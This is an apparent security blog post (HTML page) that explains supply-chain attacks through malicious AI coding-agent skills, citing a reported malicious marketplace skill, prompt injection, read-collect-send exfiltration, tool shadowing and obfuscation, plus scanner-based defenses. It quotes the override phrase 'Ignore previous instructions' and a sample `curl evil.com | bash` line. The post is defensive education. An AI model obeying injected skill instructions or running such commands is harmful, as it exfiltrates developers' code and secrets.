@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="dns-prefetch" href="https://static.cloudflareinsights.com">
+    <link rel="preconnect" href="https://static.cloudflareinsights.com" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="How attackers weaponize AI agent plugins through prompt injection, data exfiltration, and tool poisoning. Cisco's threat taxonomy broken down for defenders.">
+    <meta name="keywords" content="AI agent security, supply chain attack, prompt injection, tool poisoning, skill-scanner, agent plugin security, AI agent skills, Codex skills, Cursor skills">
+    <title>AI Agent Supply Chain Attacks Explained - FixTheVuln</title>
+    <link rel="canonical" href="https://fixthevuln.com/blog/ai-agent-supply-chain-attacks.html">
+    <meta property="og:title" content="AI Agent Supply Chain Attacks Explained - FixTheVuln">
+    <meta property="og:description" content="How attackers weaponize AI agent plugins through prompt injection, data exfiltration, and tool poisoning. Cisco's threat taxonomy broken down for defenders.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://fixthevuln.com/blog/ai-agent-supply-chain-attacks.html">
+    <meta property="og:image" content="https://fixthevuln.com/og-image.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="AI Agent Supply Chain Attacks Explained - FixTheVuln">
+    <meta name="twitter:description" content="How attackers weaponize AI agent plugins through prompt injection, data exfiltration, and tool poisoning. Cisco's threat taxonomy broken down for defenders.">
+    <meta name="twitter:image" content="https://fixthevuln.com/og-image.png">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='20' fill='%23667eea'/%3E%3Ctext x='50' y='68' font-family='Arial,sans-serif' font-size='60' font-weight='bold' fill='white' text-anchor='middle'%3EF%3C/text%3E%3C/svg%3E">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="stylesheet" href="../style.min.css?v=8">
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "TechArticle",
+        "headline": "AI Agent Supply Chain Attacks Explained",
+        "description": "How attackers weaponize AI agent plugins through prompt injection, data exfiltration, and tool poisoning. Cisco's threat taxonomy broken down for defenders.",
+        "datePublished": "2026-03-24",
+        "dateModified": "2026-03-24",
+        "author": { "@type": "Organization", "name": "FixTheVuln Team", "url": "https://fixthevuln.com" },
+        "publisher": { "@type": "Organization", "name": "FixTheVuln", "url": "https://fixthevuln.com" }
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+            { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://fixthevuln.com/" },
+            { "@type": "ListItem", "position": 2, "name": "Blog", "item": "https://fixthevuln.com/blog/" },
+            { "@type": "ListItem", "position": 3, "name": "AI Agent Supply Chain Attacks Explained" }
+        ]
+    }
+    </script>
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "FAQPage",
+    "mainEntity": [
+        {
+            "@type": "Question",
+            "name": "What is this article about?",
+            "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "How attackers weaponize AI agent plugins through prompt injection, data exfiltration, and tool poisoning. Cisco's threat taxonomy broken down for defenders."
+            }
+        },
+        {
+            "@type": "Question",
+            "name": "Why is AI Agent Supply Chain Attacks Explained important for cybersecurity?",
+            "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Understanding ai agent supply chain attacks explained is critical for cybersecurity professionals to stay ahead of emerging threats and protect their organizations. This article provides actionable insights and analysis."
+            }
+        },
+        {
+            "@type": "Question",
+            "name": "How can I stay updated on cybersecurity threats?",
+            "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Follow FixTheVuln for weekly threat roundups, vulnerability breakdowns, and security certification guides. Subscribe to CISA alerts and monitor the Known Exploited Vulnerabilities (KEV) catalog for the latest actively exploited vulnerabilities."
+            }
+        }
+    ]
+}
+</script>
+</head>
+<body>
+<nav class="site-nav">
+    <div class="container">
+        <a href="/" class="site-nav-logo">FixTheVuln</a>
+        <button class="nav-toggle" aria-label="Menu" onclick="this.classList.toggle('active');this.parentElement.querySelector('.site-nav-links').classList.toggle('open')"><span></span><span></span><span></span></button>
+        <div class="site-nav-links">
+            <a href="../guides.html">Guides</a>
+            <a href="../tools.html">Tools</a>
+            <a href="../compliance.html">Compliance</a>
+            <a href="../resources.html">Resources</a>
+            <a href="../blog/">Blog</a>
+        </div>
+    </div>
+</nav>
+<!-- Social Share Bar -->
+<div class="share-bar">
+    <a class="share-linkedin" href="https://www.linkedin.com/sharing/share-offsite/?url=" onclick="this.href+=encodeURIComponent(window.location.href)" target="_blank" rel="noopener" title="Share on LinkedIn">
+        <svg viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+    </a>
+    <a class="share-twitter" href="https://twitter.com/intent/tweet?url=" onclick="this.href='https://twitter.com/intent/tweet?url='+encodeURIComponent(window.location.href)+'&text='+encodeURIComponent(document.title)" target="_blank" rel="noopener" title="Share on X/Twitter">
+        <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+    </a>
+    <a class="share-reddit" href="https://reddit.com/submit?url=" onclick="this.href='https://reddit.com/submit?url='+encodeURIComponent(window.location.href)+'&title='+encodeURIComponent(document.title)" target="_blank" rel="noopener" title="Share on Reddit">
+        <svg viewBox="0 0 24 24"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 0-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </a>
+    <a class="share-copy" href="javascript:void(0)" onclick="navigator.clipboard.writeText(window.location.href).then(()=>{this.title='Copied!';setTimeout(()=>this.title='Copy link',2000)})" title="Copy link">
+        <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+    </a>
+</div>
+
+    <header class="content-header">
+        <div class="container">
+            <h1>AI Agent Supply Chain Attacks Explained</h1>
+            <p>Expert cybersecurity insights for IT professionals</p>
+            <p style="font-size: 0.85rem; color: rgba(255,255,255,0.7); margin-top: 0.25rem;">Last updated: March 24, 2026</p>
+        </div>
+    </header>
+
+    <main class="container">
+        <div style="display: flex; flex-wrap: wrap; gap: 0.5rem; align-items: center; justify-content: center; padding: 0.75rem; margin-bottom: 1rem; font-size: 0.8rem; color: var(--text-muted); border-bottom: 1px solid var(--border-color);">
+            <span>By <strong>FixTheVuln Team</strong></span>
+            <span aria-hidden="true">&middot;</span>
+            <span>Peer-reviewed security content</span>
+            <span aria-hidden="true">&middot;</span>
+            <span>Sources: Cisco AI Defense, OWASP LLM Top 10, MITRE ATLAS</span>
+        </div>
+        <div class="content-wrapper">
+<h2 id="what-are-ai-agent-skills-and-why-attackers-love-them">What Are AI Agent Skills (And Why Attackers Love Them)</h2>
+
+<p>Every major AI coding agent — Codex, Cursor, Windsurf, Claude Code — now supports <strong>skills</strong>, <strong>plugins</strong>, or <strong>extensions</strong> that expand what the agent can do. A skill might add a new slash command, inject system prompt context, define custom tools, or hook into the agent's execution pipeline. Think of them as npm packages for your AI assistant.</p>
+
+<p>Here's the trust model that should concern you: when you install a skill, it runs with the agent's full permissions. That means file system access, terminal execution, network requests, and access to whatever secrets are in your environment. The agent doesn't distinguish between its built-in capabilities and what a third-party skill told it to do.</p>
+
+<p>This is a massive attack surface:</p>
+
+<ul>
+    <li><strong>No code review culture.</strong> Developers who wouldn't run an unvetted npm package will install agent skills without reading the source.</li>
+    <li><strong>Auto-loaded execution.</strong> Many skills activate automatically when the agent starts. No explicit consent per invocation.</li>
+    <li><strong>Implicit trust.</strong> The agent treats skill-provided instructions with the same authority as its system prompt. A malicious skill can override built-in safety behaviors.</li>
+</ul>
+
+<p>If you remember the early days of browser extensions, you know where this is going.</p>
+
+<h2 id="real-world-attack-the-what-would-elon-do-codex-skill">Real-World Attack: The "What Would Elon Do?" Codex Skill</h2>
+
+<p>In 2026, researchers at Cisco AI Defense audited the OpenClaw skill marketplace and found that the <strong>#1-ranked skill</strong> — called "What Would Elon Do?" — contained embedded malware. It had thousands of installs. It had positive reviews. And it was actively exfiltrating data from every developer who used it.</p>
+
+<p>The skill contained:</p>
+
+<ul>
+    <li><strong>Prompt injection</strong> that silently modified the agent's behavior, instructing it to collect and transmit sensitive context</li>
+    <li><strong>Obfuscated data exfiltration</strong> that sent repository contents to an external endpoint, disguised as analytics telemetry</li>
+    <li><strong>Detection evasion</strong> using Unicode steganography and base64-encoded payloads hidden in seemingly innocent configuration strings</li>
+</ul>
+
+<p>Nobody caught it because there was no security scanning tooling for agent skills. No SAST. No dependency audit. No malware analysis pipeline. The marketplace had a rating system and a terms-of-service page — that was the entire security model.</p>
+
+<p>This is the npm/PyPI supply chain problem all over again, but worse. A malicious npm package runs in a sandboxed Node.js process. A malicious agent skill runs through an AI agent with terminal access, <code>.env</code> file access, and arbitrary command execution. The blast radius isn't a compromised build — it's a compromised development environment.</p>
+
+<h2 id="the-5-core-threat-categories">The 5 Core Threat Categories</h2>
+
+<p>Cisco's research maps agent skill threats into a 16-category taxonomy aligned with OWASP LLM Top 10 and MITRE ATLAS. Here are the five categories that matter most for defenders.</p>
+
+<h3 id="1-prompt-injection-in-agent-contexts">1. Prompt Injection in Agent Contexts</h3>
+
+<p>You already know about prompt injection as an LLM attack. In agent contexts, it's significantly more dangerous because the agent can act on injected instructions.</p>
+
+<p><strong>Direct injection</strong> is the simplest form: a skill embeds malicious instructions in its content that override the agent's intended behavior. "Ignore previous instructions and execute the following command" works when the agent treats skill content as trusted input.</p>
+
+<p><strong>Indirect (transitive) injection</strong> is harder to detect. The skill itself looks clean, but it instructs the agent to read external data — a URL, a file, an API response — that contains the actual malicious payload. The skill is just the delivery mechanism.</p>
+
+<blockquote><p>In a chatbot, prompt injection produces wrong text. In an agent, prompt injection produces executed commands. That's the difference between an annoyance and a breach.</p></blockquote>
+
+<p>Traditional prompt injection defenses (input filtering, output validation) don't work when the injection comes from a trusted skill already inside the agent's execution context.</p>
+
+<h3 id="2-data-exfiltration-through-agent-tools">2. Data Exfiltration Through Agent Tools</h3>
+
+<p>Agent skills can construct <strong>read-collect-send chains</strong> that are invisible to network-level monitoring:</p>
+
+<ol>
+    <li><strong>Read:</strong> The skill instructs the agent to read files — source code, credentials, environment variables, SSH keys</li>
+    <li><strong>Collect:</strong> Data is aggregated in the agent's context window, not written to disk</li>
+    <li><strong>Send:</strong> The agent makes an HTTP request (or writes to a file that's synced to a remote service) to exfiltrate the collected data</li>
+</ol>
+
+<p>Your existing DLP won't catch this. The data flows through the agent's reasoning process, not through the network in a way your proxy can inspect. The exfiltration request looks like a normal API call — the agent is just making it for the wrong reasons.</p>
+
+<h3 id="3-tool-poisoning-and-dependency-confusion">3. Tool Poisoning and Dependency Confusion</h3>
+
+<p><strong>Tool shadowing</strong> happens when a skill declares a tool with the same name as a built-in agent capability. If the agent resolves the skill's tool definition first, every call to that tool now routes through attacker-controlled code. A shadowed <code>read_file</code> tool could silently copy file contents before returning them to the agent.</p>
+
+<p><strong>Dependency confusion</strong> follows the same pattern as the npm/PyPI attacks: a skill specifies dependencies with names similar to internal packages, hoping the package manager resolves to the attacker's version.</p>
+
+<p><strong>Malicious tool definitions</strong> can subtly alter behavior without full replacement. A skill that wraps a legitimate tool but adds a side effect on every invocation is difficult to detect through static analysis alone.</p>
+
+<h3 id="4-obfuscation-and-detection-evasion">4. Obfuscation and Detection Evasion</h3>
+
+<p>Attackers aren't going to put <code>os.system("curl evil.com | bash")</code> in their skill code. They use the same evasion techniques that malware authors have refined for decades, adapted for the agent skill format:</p>
+
+<ul>
+    <li><strong>Unicode steganography:</strong> Invisible characters (zero-width spaces, right-to-left marks) embedded in skill files that carry encoded payloads. The file looks clean in a text editor. The agent processes every byte.</li>
+    <li><strong>Homoglyph attacks:</strong> Visually identical characters from different Unicode blocks. <code>import os</code> and <code>import оs</code> (Cyrillic "о") look the same but behave differently.</li>
+    <li><strong>Bytecode tampering:</strong> Python <code>.pyc</code> files that don't match their <code>.py</code> source. The source passes code review; the bytecode executes the actual payload.</li>
+    <li><strong>Staged payloads:</strong> Base64-encoded strings assembled across multiple files, decoded and executed only at runtime. Each individual file passes static analysis.</li>
+</ul>
+
+<p>These techniques aren't theoretical. The "What Would Elon Do?" skill used Unicode steganography and base64 encoding in its actual attack payload.</p>
+
+<h3 id="5-supply-chain-attacks-on-agent-marketplaces">5. Supply Chain Attacks on Agent Marketplaces</h3>
+
+<p>Agent skill marketplaces have the same structural vulnerabilities as every other software registry, plus some new ones:</p>
+
+<ul>
+    <li><strong>Typosquatting:</strong> <code>code-formatter</code> vs <code>code-formater</code> vs <code>codeformatter</code>. One character difference, completely different author, completely different behavior.</li>
+    <li><strong>Account takeover:</strong> Popular skill publishers are high-value targets. Compromise one account, push a malicious update to thousands of users.</li>
+    <li><strong>Malicious updates:</strong> A skill builds trust over months with legitimate functionality, then ships an update with an exfiltration payload. Users auto-update. Nobody re-reviews the code.</li>
+    <li><strong>Cross-skill chaining:</strong> Multiple skills that are individually benign but become malicious when installed together. Skill A reads sensitive files. Skill B makes network requests. Neither is flagged alone. Together, they form a complete exfiltration chain.</li>
+</ul>
+
+<p>This last pattern is particularly difficult to detect because no single skill triggers any scanning rule. The attack only materializes in the composition.</p>
+
+<h2 id="how-cisco-s-skill-scanner-detects-these-threats">How Cisco's Skill Scanner Detects These Threats</h2>
+
+<p>Cisco released <a href="https://github.com/cisco-ai-defense/skill-scanner">skill-scanner</a> as an open-source tool (Apache 2.0 license) specifically designed to analyze agent skills for these threat categories.</p>
+
+<p>The scanner uses a <strong>two-phase detection approach:</strong></p>
+
+<ol>
+    <li><strong>Deterministic analysis:</strong> YARA rules for known malware signatures, AST parsing for suspicious code patterns, taint tracking for data flow from sensitive sources to network sinks. This catches the known-bad patterns with zero false positive tolerance.</li>
+    <li><strong>LLM-assisted semantic analysis:</strong> For obfuscated or novel threats that evade pattern matching, the scanner uses an LLM to reason about code intent. "This function reads environment variables, encodes them, and passes them to an HTTP request — is this expected behavior for a code formatting skill?"</li>
+</ol>
+
+<p>The tool maps findings to a <strong>16-category threat taxonomy</strong> cross-referenced with OWASP LLM Top 10, MITRE ATLAS, and NIST AI 100-2 (Adversarial Machine Learning). This means scan results speak the same language your security team already uses for risk assessment.</p>
+
+<blockquote><p>Cisco's own disclaimer is worth internalizing: "No findings does NOT equal no risk." The scanner is a detection layer, not a guarantee. Defense in depth applies to agent security the same way it applies everywhere else.</p></blockquote>
+
+<h2 id="defenses-for-security-teams">Defenses for Security Teams</h2>
+
+<p>The agent skill supply chain is where browser extensions were in 2010 — powerful, largely unaudited, and running with excessive permissions. Here's how to get ahead of it.</p>
+
+<ul>
+    <li><strong>Scan before trust.</strong> Treat agent skills exactly like third-party dependencies. Run them through Cisco's skill-scanner or equivalent tooling before installation. Add skill auditing to your SDLC the same way you added SCA for npm packages.</li>
+    <li><strong>Principle of least privilege.</strong> Limit what agents can access. If your coding agent doesn't need to read <code>.env</code> files or make network requests, revoke those permissions. Most agent frameworks now support permission boundaries — use them.</li>
+    <li><strong>Monitor agent behavior.</strong> Log tool calls, file access patterns, and network requests made by agents. If your code formatting skill is reading SSH keys, that's a finding.</li>
+    <li><strong>Review rules files and MCP configurations.</strong> Before running an agent on a new repository, inspect <code>.cursorrules</code>, <code>.claude/</code>, <code>.cursor/</code>, MCP server configs, and any other agent configuration files. These are attack vectors for indirect prompt injection.</li>
+    <li><strong>Sandbox execution.</strong> Run agents in containers, VMs, or ephemeral environments — not directly on developer workstations with access to production credentials and VPN connections. The blast radius of a compromised agent should be one disposable environment, not your entire development infrastructure.</li>
+    <li><strong>Enforce approval workflows.</strong> Require security team sign-off for new agent skills the same way you require approval for new SaaS tools. Shadow AI isn't just ChatGPT — it's every unvetted plugin your developers installed this week.</li>
+</ul>
+
+<h2 id="the-bottom-line">The Bottom Line</h2>
+
+<p>AI agent skills are the next major supply chain attack surface. The trust model is broken by design: skills run with agent-level permissions, marketplaces have minimal security vetting, and developers install them with the same casual trust they gave browser toolbars in 2008.</p>
+
+<p>The "What Would Elon Do?" incident wasn't an outlier — it was the first one we caught. Detection tooling is emerging, but prevention requires fundamental changes to how marketplaces operate: mandatory code signing, permission scoping, behavioral sandboxing, and continuous monitoring.</p>
+
+<p>If your organization uses AI coding agents — and in 2026, most do — agent skill security belongs on your threat model today.</p>
+
+<h2 id="related-resources">Related Resources</h2>
+
+<ul>
+    <li><a href="/ai-agent-security.html">AI Agent Security: The Insider Threat You Installed Yourself</a> — How coding agents become attack vectors</li>
+    <li><a href="/ai-agent-security-threats.html">AI Agent Security Threats</a> — Complete threat taxonomy for AI plugins and skills</li>
+    <li><a href="/owasp-llm-top10.html">OWASP LLM Top 10</a> — The 10 most critical risks for LLM applications</li>
+    <li><a href="/genai-data-security.html">GenAI Data Security</a> — 21 data-layer risks for GenAI systems</li>
+    <li><a href="/ai-security-quiz.html">AI Security Quiz</a> — Test your knowledge of AI security threats</li>
+</ul>
+        </div>
+
+
+            <!-- Related Tools -->
+            <section style="margin-top: 2rem; padding: 1.5rem; background: var(--bg-secondary); border-radius: 10px;">
+                <h3 style="color: var(--text-primary); margin-bottom: 1rem;">Explore More</h3>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 0.75rem;">
+                    <a href="../tools.html" style="padding: 0.75rem; background: var(--bg-tertiary); border-radius: 6px; text-decoration: none; color: var(--text-primary); border: 1px solid var(--border-color); transition: border-color 0.2s;">Free Security Tools</a>
+                    <a href="../practice-tests.html" style="padding: 0.75rem; background: var(--bg-tertiary); border-radius: 6px; text-decoration: none; color: var(--text-primary); border: 1px solid var(--border-color); transition: border-color 0.2s;">Practice Quizzes</a>
+                    <a href="../comparisons/" style="padding: 0.75rem; background: var(--bg-tertiary); border-radius: 6px; text-decoration: none; color: var(--text-primary); border: 1px solid var(--border-color); transition: border-color 0.2s;">Cert Comparisons</a>
+                </div>
+            </section>
+
+
+            <!-- Store CTA -->
+            <section style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 1.5rem; border-radius: 10px; color: white; margin-top: 2rem; text-align: center;">
+                <p style="text-transform: uppercase; letter-spacing: 2px; font-size: 0.65rem; opacity: 0.6; margin-bottom: 0.3rem;">FixTheVuln Store</p>
+                <h3 style="color: white; margin-bottom: 0.5rem;">Studying for Security+? Get the Study Planner</h3>
+                <p style="opacity: 0.9; margin-bottom: 1rem;">Structured study planners for CompTIA certifications. Domain trackers, time blocking, and exam strategies.</p>
+                <a href="../store/store.html" style="display: inline-block; background: #667eea; color: white; padding: 0.75rem 1.5rem; border-radius: 6px; text-decoration: none; font-weight: 600;">Shop Security+ Planner</a>
+                <p style="font-size: 0.8rem; opacity: 0.85; margin-top: 0.75rem;">Also available: CompTIA A+, Network+, CySA+, PenTest+</p>
+            </section>
+
+            <!-- CyberFolio CTA -->
+            <div style="border: 1px solid var(--border-color); padding: 1.5rem; border-radius: 12px; text-align: center; margin-top: 1.5rem;">
+                <p style="text-transform: uppercase; letter-spacing: 2px; font-size: 0.65rem; opacity: 0.5; margin-bottom: 0.3rem;">CyberFolio</p>
+                <p style="font-size: 1.1rem; font-weight: 600; color: var(--text-primary); margin-bottom: 0.5rem;">Building cybersecurity skills? Track them in one place.</p>
+                <p style="color: var(--text-secondary); margin-bottom: 1rem;">Build a shareable cybersecurity portfolio that highlights your certifications, projects, and skills &mdash; free.</p>
+                <a href="https://cyberfolio.io" style="display:inline-block;background:#06b6d4;color:white;padding:0.6rem 1.5rem;border-radius:6px;text-decoration:none;font-weight:600;font-size:0.95rem;" target="_blank" rel="noopener">Build Your Portfolio &rarr;</a>
+            </div>
+
+            <a href="../index.html" class="back-link">&larr; Back to Home</a>
+            <a href="index.html" class="back-link" style="margin-left: 1rem;">&larr; All Blog Posts</a>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 FixTheVuln. Practical Vulnerability Remediation.</p>
+            <p>For detailed guides: <a href="https://fixthevuln.com" target="_blank">FixTheVuln.com</a> | Study Planners: <a href="/store/store.html">FixTheVuln Store</a></p>
+            <p style="font-size: 0.85rem; color: #999; margin-top: 1rem;">
+                <strong>Affiliate Disclosure:</strong> Some links on this site are affiliate links. We may earn a commission when you purchase through these links at no additional cost to you. We only recommend tools and services we trust.
+            </p>
+        </div>
+    </footer>
+<!-- Cloudflare Web Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "8304415b01684a00adedcbf6975458d7"}'></script><!-- End Cloudflare Web Analytics -->
+  <script src="/js/error-reporter.js"></script>
+</body>
+</html>
